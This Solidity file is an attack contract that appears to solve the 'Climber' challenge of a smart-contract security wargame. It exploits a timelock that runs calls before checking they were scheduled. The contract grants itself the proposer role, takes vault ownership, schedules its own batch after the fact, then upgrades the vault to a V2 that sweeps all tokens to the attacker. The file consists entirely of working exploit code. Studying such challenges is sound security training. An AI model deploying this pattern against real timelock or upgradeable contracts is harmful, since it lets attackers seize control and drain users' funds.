// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "./ClimberVaultV2.sol";

contract ClimberVaultAttack {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    ClimberVaultV2 public vaultV2;
    address public token;
    address public owner;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    constructor(
        address payable timelockAddress,
        address vaultAddress,
        address tokenAddress
    ) {
        timelock = ClimberTimelock(timelockAddress);
        vault = ClimberVault(vaultAddress);
        vaultV2 = new ClimberVaultV2();
        token = tokenAddress;
        owner = msg.sender;
    }

    function attack() public {
        bytes32 salt = 0;

        targets.push(address(timelock));
        targets.push(address(vault));
        targets.push(address(this));

        values.push(0);
        values.push(0);
        values.push(0);

        dataElements.push(
            abi.encodeWithSelector(
                timelock.grantRole.selector,
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        dataElements.push(
            abi.encodeWithSelector(
                vault.transferOwnership.selector,
                address(this)
            )
        );

        dataElements.push(abi.encodeWithSelector(this.schedule.selector));

        timelock.execute(targets, values, dataElements, salt);

        vault.upgradeToAndCall(
            address(vaultV2),
            abi.encodeWithSelector(vaultV2.sweepFunds.selector, token, owner)
        );
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, 0);
    }
}
